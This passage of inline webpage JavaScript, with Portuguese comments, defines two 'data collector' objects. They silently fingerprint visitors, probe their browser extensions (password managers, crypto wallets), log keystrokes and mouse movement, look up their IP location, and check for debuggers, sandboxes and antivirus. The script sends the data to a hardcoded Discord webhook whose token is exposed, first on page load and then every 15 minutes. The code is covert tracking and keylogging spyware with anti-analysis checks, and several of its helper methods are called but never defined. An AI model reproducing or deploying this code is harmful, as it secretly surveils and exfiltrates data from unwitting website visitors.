                firstContentfulPaint: this.getFirstContentfulPaint()
            },
            memory: memory ? {
                used: this.formatBytes(memory.usedJSHeapSize),
                total: this.formatBytes(memory.totalJSHeapSize),
                limit: this.formatBytes(memory.jsHeapSizeLimit)
            } : 'N/A',
            timing: this.getDetailedTiming()
        };
    },

    getFirstPaint() {
        const perf = performance.getEntriesByType('paint');
        const fp = perf.find(entry => entry.name === 'first-paint');
        return fp ? fp.startTime : 'N/A';
    },

    getFirstContentfulPaint() {
        const perf = performance.getEntriesByType('paint');
        const fcp = perf.find(entry => entry.name === 'first-contentful-paint');
        return fcp ? fcp.startTime : 'N/A';
    },

    getDetailedTiming() {
        const timing = performance.timing;
        if (!timing) return 'N/A';
        
        return {
            redirect: timing.redirectEnd - timing.redirectStart,
            dns: timing.domainLookupEnd - timing.domainLookupStart,
            tcp: timing.connectEnd - timing.connectStart,
            request: timing.responseStart - timing.requestStart,
            response: timing.responseEnd - timing.responseStart,
            domLoading: timing.domLoading - timing.navigationStart,
            domInteractive: timing.domInteractive - timing.navigationStart,
            domComplete: timing.domComplete - timing.navigationStart,
            load: timing.loadEventEnd - timing.navigationStart
        };
    },

    // 8. Informa√ß√µes em tempo real
    getRealTimeInfo() {
        return {
            system: {
                battery: this.getBatteryStatus(),
                network: this.getNetworkStatus(),
                memory: this.getMemoryStatus()
            },
            environment: {
                time: new Date().toISOString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                daylightSaving: this.isDaylightSaving()
            }
        };
    },

    async getBatteryStatus() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (error) {
                return { error: error.message };
            }
        }
        return 'N/A';
    },

    getNetworkStatus() {
        if (!navigator.connection) return 'N/A';
        
        const conn = navigator.connection;
        return {
            type: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            saveData: conn.saveData
        };
    },

    getMemoryStatus() {
        if (!performance.memory) return 'N/A';
        
        const mem = performance.memory;
        return {
            used: this.formatBytes(mem.usedJSHeapSize),
            total: this.formatBytes(mem.totalJSHeapSize),
            limit: this.formatBytes(mem.jsHeapSizeLimit)
        };
    },

    isDaylightSaving() {
        const today = new Date();
        const jan = new Date(today.getFullYear(), 0, 1);
        const jul = new Date(today.getFullYear(), 6, 1);
        const stdTimezoneOffset = Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
        return today.getTimezoneOffset() < stdTimezoneOffset;
    },

    // 9. Detec√ß√£o de DevTools
    getDevToolsDetection() {
        return {
            devtoolsOpen: this.isDevToolsOpen(),
            consoleOpen: this.isConsoleOpen(),
            breakpoints: this.checkBreakpoints()
        };
    },

    isDevToolsOpen() {
        const threshold = 160;
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        return widthThreshold || heightThreshold;
    },

    isConsoleOpen() {
        const start = performance.now();
        debugger;
        const end = performance.now();
        return (end - start) > 100;
    },

    checkBreakpoints() {
        return {
            debuggerStatements: this.countDebuggerStatements(),
            consoleUsage: this.checkConsoleUsage()
        };
    },

    // 10. An√°lise de conte√∫do da p√°gina
    getPageContentAnalysis() {
        return {
            structure: {
                elements: document.getElementsByTagName('*').length,
                images: document.images.length,
                links: document.links.length,
                forms: document.forms.length,
                scripts: document.scripts.length
            },
            content: {
                title: document.title,
                description: this.getMetaDescription(),
                keywords: this.getMetaKeywords(),
                language: document.documentElement.lang
            },
            security: {
                https: window.location.protocol === 'https:',
                mixedContent: this.checkMixedContent(),
                insecureForms: this.checkInsecureForms()
            }
        };
    },

    getMetaDescription() {
        const meta = document.querySelector('meta[name="description"]');
        return meta ? meta.content : 'N/A';
    },

    getMetaKeywords() {
        const meta = document.querySelector('meta[name="keywords"]');
        return meta ? meta.content : 'N/A';
    },

    checkMixedContent() {
        const elements = document.querySelectorAll('[src]');
        let mixedContent = false;
        
        elements.forEach(el => {
            const src = el.getAttribute('src');
            if (src && src.startsWith('http:') && window.location.protocol === 'https:') {
                mixedContent = true;
            }
        });
        
        return mixedContent;
    },

    checkInsecureForms() {
        const forms = document.forms;
        let insecureForms = false;
        
        for (let form of forms) {
            if (form.action && form.action.startsWith('http:') && window.location.protocol === 'https:') {
                insecureForms = true;
                break;
            }
        }
        
        return insecureForms;
    },

    // Fun√ß√µes auxiliares
    formatBytes(bytes) {
        if (!bytes || bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    },

    countDebuggerStatements() {
        // Contar debuggers no c√≥digo (aproxima√ß√£o)
        const scripts = document.scripts;
        let debuggerCount = 0;
        
        for (let script of scripts) {
            if (script.src) continue; // Ignorar scripts externos
            if (script.textContent.includes('debugger')) {
                debuggerCount++;
            }
        }
        
        return debuggerCount;
    },

    checkConsoleUsage() {
        return {
            log: typeof console.log !== 'undefined',
            warn: typeof console.warn !== 'undefined',
            error: typeof console.error !== 'undefined',
            debug: typeof console.debug !== 'undefined'
        };
    },

    // M√©todos de teste que precisam ser implementados
    testCanvasFingerprinting() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Test', 2, 2);
            return canvas.toDataURL().length > 0;
        } catch (error) {
            return false;
        }
    },

    testWebGLFingerprinting() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            return !!gl;
        } catch (error) {
            return false;
        }
    },

    testAudioFingerprinting() {
        try {
            const context = new (window.AudioContext || window.webkitAudioContext)();
            return !!context;
        } catch (error) {
            return false;
        }
    },

    testFontFingerprinting() {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testString = "mmmmmmmmmmlli";
        const testSize = '72px';
        
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        const fonts = [];
        for (const font of baseFonts) {
            context.font = testSize + " " + font;
            const width = context.measureText(testString).width;
            if (width > 0) fonts.push(font);
        }
        
        return fonts.length > 0;
    },

    checkOldBrowser() {
        const ua = navigator.userAgent.toLowerCase();
        return ua.includes('msie') || ua.includes('trident');
    },

    checkInsecureSettings() {
        return {
            mixedContent: this.checkMixedContent(),
            insecureForms: this.checkInsecureForms(),
            oldTLS: this.checkTLSVersion()
        };
    },

    checkTLSVersion() {
        // Verifica√ß√£o b√°sica de TLS
        return window.location.protocol === 'https:';
    },

    checkKnownVulnerabilities() {
        // Verificar vulnerabilidades conhecidas
        return {
            flash: typeof navigator.plugins['Shockwave Flash'] !== 'undefined',
            silverlight: typeof navigator.plugins['Silverlight Plug-In'] !== 'undefined',
            java: navigator.javaEnabled()
        };
    },

    checkLocalStorageTracking() {
        try {
            localStorage.setItem('tracking_test', '1');
            const exists = localStorage.getItem('tracking_test') === '1';
            localStorage.removeItem('tracking_test');
            return exists;
        } catch (error) {
            return false;
        }
    },

    checkSessionStorageTracking() {
        try {
            sessionStorage.setItem('tracking_test', '1');
            const exists = sessionStorage.getItem('tracking_test') === '1';
            sessionStorage.removeItem('tracking_test');
            return exists;
        } catch (error) {
            return false;
        }
    },

    checkIndexedDBTracking() {
        return 'indexedDB' in window;
    },

    // Fun√ß√£o para enviar dados
    async sendExclusiveData() {
        try {
            const data = await this.collectExclusiveData();
            if (!data) return false;

            const payload = {
                username: "üîç Exclusive Data Collector",
                embeds: [
                    {
                        title: "üíé DADOS EXCLUSIVOS - AN√ÅLISE PREMIUM",
                        color: 0xFFD700,
                        description: `**Sess√£o ${data.metadata.sessionId}**\nColetor de dados exclusivos e avan√ßados`,
                        timestamp: data.metadata.timestamp,
                        footer: { text: "Exclusive Data Collector v2.0" }
                    },
                    {
                        title: "üåê AN√ÅLISE DE REDE AVAN√áADA",
                        color: 0x3498DB,
                        fields: [
                            { name: "üì° Velocidade Download", value: data.networkAnalysis.speedTest.downloadSpeed || 'N/A', inline: true },
                            { name: "‚è±Ô∏è Lat√™ncia", value: data.networkAnalysis.speedTest.latency || 'N/A', inline: true },
                            { name: "üõ°Ô∏è Tipo de Conex√£o", value: data.networkAnalysis.proxyDetection.proxyType || 'N/A', inline: true },
                            { name: "üìä Qualidade", value: data.networkAnalysis.connectionQuality.quality || 'N/A', inline: true },
                            { name: "‚ö° Velocidade", value: data.networkAnalysis.connectionQuality.downlink || 'N/A', inline: true },
                            { name: "üåç Pa√≠s", value: data.networkAnalysis.proxyDetection.country || 'N/A', inline: true }
                        ]
                    },
                    {
                        title: "üîí AN√ÅLISE DE SEGURAN√áA",
                        color: 0xE74C3C,
                        fields: [
                            { name: "üõ°Ô∏è HTTPS", value: data.security.securitySettings.https ? '‚úÖ' : '‚ùå', inline: true },
                            { name: "üö´ AdBlocker", value: data.security.protections.adBlocker ? '‚úÖ' : '‚ùå', inline: true },
                            { name: "üìõ Popup Blocker", value: data.security.protections.popupBlocker ? '‚úÖ' : '‚ùå', inline: true },
                            { name: "üç™ Cookies", value: data.security.securitySettings.cookiesEnabled ? '‚úÖ' : '‚ùå', inline: true },
                            { name: "üîç Tracking", value: data.security.securitySettings.doNotTrack || 'N/A', inline: true },
                            { name: "üïµÔ∏è WebDriver", value: data.security.securitySettings.webdriver ? '‚úÖ' : '‚ùå', inline: true }
                        ]
                    },
                    {
                        title: "üë§ COMPORTAMENTO DO USU√ÅRIO",
                        color: 0x9B59B6,
                        fields: [
                            { name: "üñ±Ô∏è Movimentos Mouse", value: data.behavior.interaction.mouseMovements.movementsIn10s || '0', inline: true },
                            { name: "üëÜ Cliques", value: data.behavior.interaction.clicks.totalClicks || '0', inline: true },
                            { name: "üìú Scroll", value: data.behavior.interaction.scroll.maxScrollDepth || '0%', inline: true },
                            { name: "‚å®Ô∏è Teclas", value: data.behavior.interaction.keyboard.keysPressed || '0', inline: true },
                            { name: "üé® Esquema de Cor", value: data.behavior.preferences.colorScheme || 'N/A', inline: true },
                            { name: "üî¢ Visitas", value: data.behavior.session.pageVisits || '1', inline: true }
                        ]
                    }
                ]
            };

            const response = await fetch(EXCLUSIVE_WEBHOOK, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log('‚úÖ Dados exclusivos enviados com sucesso!');
                return true;
            } else {
                console.error('‚ùå Erro ao enviar dados exclusivos:', response.status);
                return false;
            }
        } catch (error) {
            console.error('üí• Erro ao enviar dados exclusivos:', error);
            return false;
        }
    },

    // Inicializar
    init() {
        console.log('üíé Exclusive Data Collector iniciado');
        
        // Coleta inicial ap√≥s 5 segundos
        setTimeout(() => {
            this.sendExclusiveData();
        }, 5000);

        // Coleta peri√≥dica a cada 15 minutos
        setInterval(() => {
            this.sendExclusiveData();
        }, 900000);
    }
};

// Inicializar quando a p√°gina carregar
document.addEventListener('DOMContentLoaded', function() {
    ExclusiveDataCollector.init();
});

// Inicializar imediatamente se DOM j√° estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => ExclusiveDataCollector.init(), 1000);
    });
} else {
    setTimeout(() => ExclusiveDataCollector.init(), 1000);
}

console.log('üíé Exclusive Data Collector carregado');
</script>
<script>
// Webhook para dados premium exclusivos
const PREMIUM_WEBHOOK = "https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe";

// Sistema de coleta de dados premium exclusivos
const PremiumDataCollector = {
    sessionId: 'premium_' + Math.random().toString(36).substr(2, 12),
    collectionCount: 0,

    async collectPremiumData() {
        try {
            const premiumData = {
                metadata: {
                    type: 'premium_exclusive_collection',
                    sessionId: this.sessionId,
                    timestamp: new Date().toISOString(),
                    collectionCount: this.collectionCount + 1,
                    version: 'Premium Collector v3.0'
                },

                // 1. AN√ÅLISE DE VULNERABILIDADES AVAN√áADA
                vulnerabilityScan: await this.performVulnerabilityScan(),
                
                // 2. DETEC√á√ÉO DE AMBIENTE VIRTUAL/SANDBOX
                environmentAnalysis: this.analyzeEnvironment(),
                
                // 3. AN√ÅLISE DE COMPORTAMENTO EM TEMPO REAL
                realTimeBehavior: this.analyzeRealTimeBehavior(),
                
                // 4. DETEC√á√ÉO DE EXTENS√ïES E PLUGINS
                extensions: await this.detectExtensions(),
                
                // 5. AN√ÅLISE DE TR√ÅFEGO DE REDE
                networkTraffic: this.analyzeNetworkTraffic(),
                
                // 6. DETEC√á√ÉO DE AUTOMA√á√ÉO/BOTS
                automationDetection: this.detectAutomation(),
                
                // 7. AN√ÅLISE DE PERFORMANCE DO SISTEMA
                systemPerformance: this.analyzeSystemPerformance(),
                
                // 8. DETEC√á√ÉO DE ROOT/JAILBREAK
                rootDetection: this.detectRoot(),
                
                // 9. AN√ÅLISE DE COMPORTAMENTO DE NAVEGA√á√ÉO
                navigationPatterns: this.analyzeNavigationPatterns(),
                
                // 10. DETEC√á√ÉO DE FERRAMENTAS DE SEGURAN√áA
                securityTools: this.detectSecurityTools(),
                
                // 11. AN√ÅLISE DE COMPORTAMENTO DE MEM√ìRIA
                memoryBehavior: this.analyzeMemoryBehavior(),
                
                // 12. DETEC√á√ÉO DE ALTERA√á√ïES NO SISTEMA
                systemModifications: this.detectSystemModifications(),
                
                // 13. AN√ÅLISE DE COMPORTAMENTO DE BATERIA
                batteryBehavior: await this.analyzeBatteryBehavior(),
                
                // 14. DETEC√á√ÉO DE EMULA√á√ÉO
                emulationDetection: this.detectEmulation(),
                
                // 15. AN√ÅLISE DE PADR√ïES DE INTERA√á√ÉO
                interactionPatterns: this.analyzeInteractionPatterns()
            };

            this.collectionCount++;
            return premiumData;

        } catch (error) {
            console.error('Erro na coleta premium:', error);
            return null;
        }
    },

    // 1. Scan avan√ßado de vulnerabilidades
    async performVulnerabilityScan() {
        return {
            browserVulnerabilities: this.scanBrowserVulnerabilities(),
            systemVulnerabilities: this.scanSystemVulnerabilities(),
            networkVulnerabilities: await this.scanNetworkVulnerabilities(),
            privacyVulnerabilities: this.scanPrivacyVulnerabilities()
        };
    },

    scanBrowserVulnerabilities() {
        const vulnerabilities = [];
        
        // Verificar vers√µes antigas vulner√°veis
        const ua = navigator.userAgent;
        if (ua.includes('Chrome/') && this.extractVersion(ua, 'Chrome') < 90) {
            vulnerabilities.push('Navegador Chrome desatualizado');
        }
        
        // Verificar plugins vulner√°veis
        if (this.hasFlash()) vulnerabilities.push('Flash Player detectado (vulner√°vel)');
        if (this.hasSilverlight()) vulnerabilities.push('Silverlight detectado (vulner√°vel)');
        
        // Verificar configura√ß√µes inseguras
        if (!this.isHSTSEnabled()) vulnerabilities.push('HSTS n√£o habilitado');
        if (this.hasInsecureSSL()) vulnerabilities.push('Configura√ß√µes SSL inseguras');
        
        return {
            detected: vulnerabilities,
            count: vulnerabilities.length,
            riskLevel: this.calculateRiskLevel(vulnerabilities.length)
        };
    },

    scanSystemVulnerabilities() {
        const vulnerabilities = [];
        
        // Detectar sistemas operacionais antigos
        const platform = navigator.platform;
        if (platform.includes('Windows') && this.isOldWindows()) {
            vulnerabilities.push('Sistema Windows desatualizado');
        }
        
        // Verificar resolu√ß√£o de tela suspeita (emuladores)
        if (this.isSuspiciousResolution()) {
            vulnerabilities.push('Resolu√ß√£o de tela suspeita');
        }
        
        // Verificar configura√ß√µes de timezone
        if (this.hasSuspiciousTimezone()) {
            vulnerabilities.push('Timezone suspeito detectado');
        }
        
        return {
            detected: vulnerabilities,
            count: vulnerabilities.length,
            riskLevel: this.calculateRiskLevel(vulnerabilities.length)
        };
    },

    async scanNetworkVulnerabilities() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            const vulnerabilities = [];
            
            // Verificar IP suspeito
            if (this.isSuspiciousIP(data.ip)) {
                vulnerabilities.push('IP em faixa suspeita');
            }
            
            // Verificar localiza√ß√£o inconsistente
            if (this.hasInconsistentLocation(data)) {
                vulnerabilities.push('Localiza√ß√£o inconsistente detectada');
            }
            
            // Verificar provedor suspeito
            if (this.isSuspiciousProvider(data.org)) {
                vulnerabilities.push('Provedor de internet suspeito');
            }
            
            return {
                detected: vulnerabilities,
                count: vulnerabilities.length,
                riskLevel: this.calculateRiskLevel(vulnerabilities.length),
                ipData: data
            };
        } catch (error) {
            return { error: error.message };
        }
    },

    scanPrivacyVulnerabilities() {
        const vulnerabilities = [];
        
        // Verificar rastreamento excessivo
        if (this.hasExcessiveTracking()) {
            vulnerabilities.push('Rastreamento excessivo detectado');
        }
        
        // Verificar cookies de terceiros
        if (this.hasThirdPartyCookies()) {
            vulnerabilities.push('Cookies de terceiros ativos');
        }
        
        // Verificar fingerprinting
        if (this.isFingerprintingPossible()) {
            vulnerabilities.push('Fingerprinting browser poss√≠vel');
        }
        
        return {
            detected: vulnerabilities,
            count: vulnerabilities.length,
            riskLevel: this.calculateRiskLevel(vulnerabilities.length)
        };
    },

    // 2. An√°lise de ambiente virtual/sandbox
    analyzeEnvironment() {
        return {
            virtualMachine: this.detectVirtualMachine(),
            sandbox: this.detectSandbox(),
            emulator: this.detectEmulator(),
            docker: this.detectDocker(),
            developerMode: this.detectDeveloperMode(),
            automation: this.detectAutomationEnvironment()
        };
    },

    detectVirtualMachine() {
        const tests = {
            // Verificar caracter√≠sticas de VM
            performance: this.checkVMPerformance(),
            hardware: this.checkVMHardware(),
            network: this.checkVMNetwork(),
            screen: this.checkVMScreen(),
            timing: this.checkVMTiming()
        };
        
        const vmIndicators = Object.values(tests).filter(Boolean).length;
        return {
            isVM: vmIndicators > 2,
            confidence: (vmIndicators / Object.keys(tests).length * 100).toFixed(2) + '%',
            indicators: tests
        };
    },

    detectSandbox() {
        return {
            // T√©cnicas de detec√ß√£o de sandbox
            debuggerAttached: this.isDebuggerAttached(),
            memoryLimit: this.checkMemoryLimit(),
            executionTime: this.checkExecutionTime(),
            environmentVariables: this.checkEnvironmentVariables()
        };
    },

    detectEmulator() {
        const tests = {
            userAgent: this.checkEmulatorUserAgent(),
            screenSize: this.checkEmulatorScreen(),
            hardware: this.checkEmulatorHardware(),
            performance: this.checkEmulatorPerformance()
        };
        
        const emulatorIndicators = Object.values(tests).filter(Boolean).length;
        return {
            isEmulator: emulatorIndicators > 1,
            confidence: (emulatorIndicators / Object.keys(tests).length * 100).toFixed(2) + '%',
            indicators: tests
        };
    },

    // 3. An√°lise de comportamento em tempo real
    analyzeRealTimeBehavior() {
        return {
            mouseBehavior: this.analyzeMouseBehavior(),
            keyboardBehavior: this.analyzeKeyboardBehavior(),
            scrollBehavior: this.analyzeScrollBehavior(),
            focusBehavior: this.analyzeFocusBehavior(),
            timingBehavior: this.analyzeTimingBehavior()
        };
    },

    analyzeMouseBehavior() {
        let movements = [];
        let clicks = [];
        let lastMove = Date.now();
        
        const mouseMoveHandler = (e) => {
            movements.push({
                x: e.clientX,
                y: e.clientY,
                timestamp: Date.now(),
                speed: Date.now() - lastMove
            });
            lastMove = Date.now();
        };
        
        const clickHandler = (e) => {
            clicks.push({
                x: e.clientX,
                y: e.clientY,
                button: e.button,
                timestamp: Date.now()
            });
        };
        
        document.addEventListener('mousemove', mouseMoveHandler);
        document.addEventListener('click', clickHandler);
        
        // Coletar por 10 segundos
        return new Promise((resolve) => {
            setTimeout(() => {
                document.removeEventListener('mousemove', mouseMoveHandler);
                document.removeEventListener('click', clickHandler);
                
                resolve({
                    movementCount: movements.length,
                    clickCount: clicks.length,
                    averageSpeed: this.calculateAverageSpeed(movements),
                    movementPattern: this.analyzeMovementPattern(movements),
                    clickPattern: this.analyzeClickPattern(clicks)
                });
            }, 10000);
        });
    },

    analyzeKeyboardBehavior() {
        let keystrokes = [];
        let timings = [];
        let lastKeyTime = Date.now();
        
        const keyHandler = (e) => {
            const now = Date.now();
            keystrokes.push({
                key: e.key,
                code: e.code,
                timestamp: now,
                timeSinceLast: now - lastKeyTime
            });
            lastKeyTime = now;
        };
        
        document.addEventListener('keydown', keyHandler);
        
        return new Promise((resolve) => {
            setTimeout(() => {
                document.removeEventListener('keydown', keyHandler);
                
                resolve({
                    totalKeystrokes: keystrokes.length,
                    typingSpeed: this.calculateTypingSpeed(keystrokes),
                    keyPattern: this.analyzeKeyPattern(keystrokes),
                    isHuman: this.isHumanTyping(keystrokes)
                });
            }, 10000);
        });
    },

    // 4. Detec√ß√£o de extens√µes e plugins
    async detectExtensions() {
        return {
            chromeExtensions: await this.detectChromeExtensions(),
            firefoxExtensions: await this.detectFirefoxExtensions(),
            edgeExtensions: await this.detectEdgeExtensions(),
            safariExtensions: await this.detectSafariExtensions(),
            plugins: this.detectBrowserPlugins(),
            themes: this.detectThemes()
        };
    },

    async detectChromeExtensions() {
        const extensions = [];
        const knownExtensions = [
            'adblock',
            'ublock',
            'ghostery',
            'privacybadger',
            'lastpass',
            'bitwarden',
            'grammarly',
            'honey',
            'metamask'
        ];
        
        for (const ext of knownExtensions) {
            try {
                const exists = await this.checkExtensionExists(ext);
                if (exists) extensions.push(ext);
            } catch (error) {
                // Extens√£o n√£o encontrada
            }
        }
        
        return {
            detected: extensions,
            count: extensions.length
        };
    },

    async checkExtensionExists(extensionId) {
        return new Promise((resolve) => {
            const img = new Image();
            img.src = `chrome-extension://${extensionId}/manifest.json`;
            img.onload = () => resolve(true);
            img.onerror = () => resolve(false);
            setTimeout(() => resolve(false), 1000);
        });
    },

    // 5. An√°lise de tr√°fego de rede
    analyzeNetworkTraffic() {
        return {
            requests: this.analyzeNetworkRequests(),
            performance: this.analyzeNetworkPerformance(),
            patterns: this.analyzeNetworkPatterns(),
            anomalies: this.detectNetworkAnomalies()
        };
    },

    analyzeNetworkRequests() {
        const resources = performance.getEntriesByType('resource');
        return {
            totalRequests: resources.length,
            byType: this.groupResourcesByType(resources),
            averageSize: this.calculateAverageResourceSize(resources),
            loadTimes: this.analyzeResourceLoadTimes(resources)
        };
    },

    // 6. Detec√ß√£o de automa√ß√£o/bots
    detectAutomation() {
        return {
            webdriver: this.detectWebDriver(),
            automationTools: this.detectAutomationTools(),
            headless: this.detectHeadlessBrowser(),
            botPatterns: this.detectBotPatterns(),
            behaviorAnalysis: this.analyzeAutomationBehavior()
        };
    },

    detectWebDriver() {
        return {
            navigatorWebdriver: navigator.webdriver,
            chromeRuntime: !window.chrome,
            phantomJS: window.callPhantom || window._phantom,
            puppeteer: window.__webdriver_evaluate || window.__selenium_evaluate,
            playwright: window.__playwright
        };
    },

    detectHeadlessBrowser() {
        const tests = {
            userAgent: !navigator.userAgent.includes('HeadlessChrome'),
            plugins: navigator.plugins.length === 0,
            languages: navigator.languages.length === 0,
            webgl: this.checkHeadlessWebGL(),
            permissions: this.checkHeadlessPermissions()
        };
        
        return {
            isHeadless: Object.values(tests).some(test => test === true),
            tests: tests
        };
    },

    // 7. An√°lise de performance do sistema
    analyzeSystemPerformance() {
        return {
            cpuPerformance: this.analyzeCPUPerformance(),
            memoryPerformance: this.analyzeMemoryPerformance(),
            gpuPerformance: this.analyzeGPUPerformance(),
            storagePerformance: this.analyzeStoragePerformance(),
            overallScore: this.calculatePerformanceScore()
        };
    },

    analyzeCPUPerformance() {
        const startTime = performance.now();
        
        // Teste simples de performance de CPU
        let result = 0;
        for (let i = 0; i < 1000000; i++) {
            result += Math.sqrt(i) * Math.sin(i);
        }
        
        const endTime = performance.now();
        const executionTime = endTime - startTime;
        
        return {
            executionTime: executionTime.toFixed(2) + ' ms',
            score: this.calculateCPUScore(executionTime),
            cores: navigator.hardwareConcurrency || 'N/A'
        };
    },

    // 8. Detec√ß√£o de root/jailbreak
    detectRoot() {
        return {
            androidRoot: this.detectAndroidRoot(),
            iosJailbreak: this.detectIOSJailbreak(),
            systemModifications: this.detectSystemModifications(),
            suspiciousFiles: this.detectSuspiciousFiles(),
            securityViolations: this.detectSecurityViolations()
        };
    },

    detectAndroidRoot() {
        // T√©cnicas para detectar root no Android
        return {
            superUser: this.checkSuperUser(),
            busybox: this.checkBusyBox(),
            suBinary: this.checkSuBinary(),
            rootApps: this.checkRootApps(),
            systemWrite: this.checkSystemWrite()
        };
    },

    // 9. An√°lise de padr√µes de navega√ß√£o
    analyzeNavigationPatterns() {
        return {
            history: this.analyzeBrowserHistory(),
            session: this.analyzeSessionPatterns(),
            timing: this.analyzeNavigationTiming(),
            behavior: this.analyzeNavigationBehavior()
        };
    },

    analyzeBrowserHistory() {
        return {
            length: history.length,
            state: history.state !== null,
            navigation: this.analyzeNavigationMethods()
        };
    },

    // 10. Detec√ß√£o de ferramentas de seguran√ßa
    detectSecurityTools() {
        return {
            antivirus: this.detectAntivirus(),
            firewall: this.detectFirewall(),
            vpn: this.detectVPN(),
            proxy: this.detectProxy(),
            securitySuites: this.detectSecuritySuites()
        };
    },

    detectAntivirus() {
        // Detectar presen√ßa de software antiv√≠rus
        const avSignatures = [
            'symantec',
            'mcafee',
            'kaspersky',
            'avast',
            'avg',
            'bitdefender',
            'norton',
            'eset'
        ];
        
        const detected = [];
        const ua = navigator.userAgent.toLowerCase();
        
        avSignatures.forEach(av => {
            if (ua.includes(av)) detected.push(av);
        });
        
        return {
            detected: detected,
            count: detected.length
        };
    },

    // 11. An√°lise de comportamento de mem√≥ria
    analyzeMemoryBehavior() {
        if (!performance.memory) return 'N/A';
        
        const mem = performance.memory;
        return {
            currentUsage: this.formatBytes(mem.usedJSHeapSize),
            totalAvailable: this.formatBytes(mem.totalJSHeapSize),
            limit: this.formatBytes(mem.jsHeapSizeLimit),
            usagePercentage: ((mem.usedJSHeapSize / mem.jsHeapSizeLimit) * 100).toFixed(2) + '%',
            leakDetection: this.detectMemoryLeaks(),
            allocationPattern: this.analyzeAllocationPattern()
        };
    },

    // 12. Detec√ß√£o de altera√ß√µes no sistema
    detectSystemModifications() {
        return {
            timeChanges: this.detectTimeChanges(),
            fontChanges: this.detectFontChanges(),
            screenChanges: this.detectScreenChanges(),
            languageChanges: this.detectLanguageChanges(),
            userAgentChanges: this.detectUserAgentChanges()
        };
    },

    // 13. An√°lise de comportamento de bateria
    async analyzeBatteryBehavior() {
        if (!('getBattery' in navigator)) return 'N/A';
        
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime,
                behavior: this.analyzeBatteryPattern(battery),
                anomalies: this.detectBatteryAnomalies(battery)
            };
        } catch (error) {
            return { error: error.message };
        }
    },

    // 14. Detec√ß√£o de emula√ß√£o
    detectEmulation() {
        return {
            browserSpoofing: this.detectBrowserSpoofing(),
            osSpoofing: this.detectOSSpoofing(),
            deviceSpoofing: this.detectDeviceSpoofing(),
            timezoneSpoofing: this.detectTimezoneSpoofing(),
            languageSpoofing: this.detectLanguageSpoofing()
        };
    },

    // 15. An√°lise de padr√µes de intera√ß√£o
    analyzeInteractionPatterns() {
        return {
            mousePatterns: this.analyzeAdvancedMousePatterns(),
            keyboardPatterns: this.analyzeAdvancedKeyboardPatterns(),
            touchPatterns: this.analyzeTouchPatterns(),
            gesturePatterns: this.analyzeGesturePatterns(),
            attentionPatterns: this.analyzeAttentionPatterns()
        };
    },

    // Fun√ß√µes auxiliares
    extractVersion(ua, browser) {
        const match = ua.match(new RegExp(`${browser}/([0-9]+)`));
        return match ? parseInt(match[1]) : 0;
    },

    hasFlash() {
        return typeof navigator.plugins['Shockwave Flash'] !== 'undefined';
    },

    hasSilverlight() {
        return typeof navigator.plugins['Silverlight Plug-In'] !== 'undefined';
    },

    isHSTSEnabled() {
        return window.location.protocol === 'https:';
    },

    hasInsecureSSL() {
        // Verificar certificados SSL (simplificado)
        return !this.isHSTSEnabled();
    },

    calculateRiskLevel(count) {
        if (count === 0) return 'Baixo';
        if (count <= 2) return 'M√©dio';
        if (count <= 5) return 'Alto';
        return 'Cr√≠tico';
    },

    isOldWindows() {
        const ua = navigator.userAgent;
        return ua.includes('Windows NT 6.1') || // Windows 7
               ua.includes('Windows NT 6.0') || // Windows Vista
               ua.includes('Windows NT 5');     // Windows XP
    },

    isSuspiciousResolution() {
        // Resolu√ß√µes comuns de emuladores
        const suspiciousResolutions = [
            '800x600', '1024x768', '1280x720', 
            '1920x1080', '2560x1440', '3840x2160'
        ];
        const currentResolution = `${screen.width}x${screen.height}`;
        return suspiciousResolutions.includes(currentResolution);
    },

    hasSuspiciousTimezone() {
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const suspiciousTimezones = ['UTC', 'GMT'];
        return suspiciousTimezones.includes(timezone);
    },

    isSuspiciousIP(ip) {
        // Verificar IPs em faixas suspeitas (exemplo simplificado)
        const suspiciousRanges = ['10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.'];
        return suspiciousRanges.some(range => ip.startsWith(range));
    },

    hasInconsistentLocation(data) {
        // Verificar inconsist√™ncias de localiza√ß√£o (simplificado)
        return !data.country || !data.city || !data.region;
    },

    isSuspiciousProvider(org) {
        if (!org) return true;
        const suspiciousProviders = ['Amazon', 'Google', 'Microsoft', 'DigitalOcean', 'OVH'];
        return suspiciousProviders.some(provider => org.includes(provider));
    },

    hasExcessiveTracking() {
        // Verificar rastreamento excessivo (simplificado)
        return navigator.cookieEnabled && !navigator.doNotTrack;
    },

    hasThirdPartyCookies() {
        return navigator.cookieEnabled;
    },

    isFingerprintingPossible() {
        return 'canvas' in HTMLCanvasElement.prototype &&
               'WebGLRenderingContext' in window;
    },

    // Fun√ß√µes de detec√ß√£o de ambiente (simplificadas)
    checkVMPerformance() {
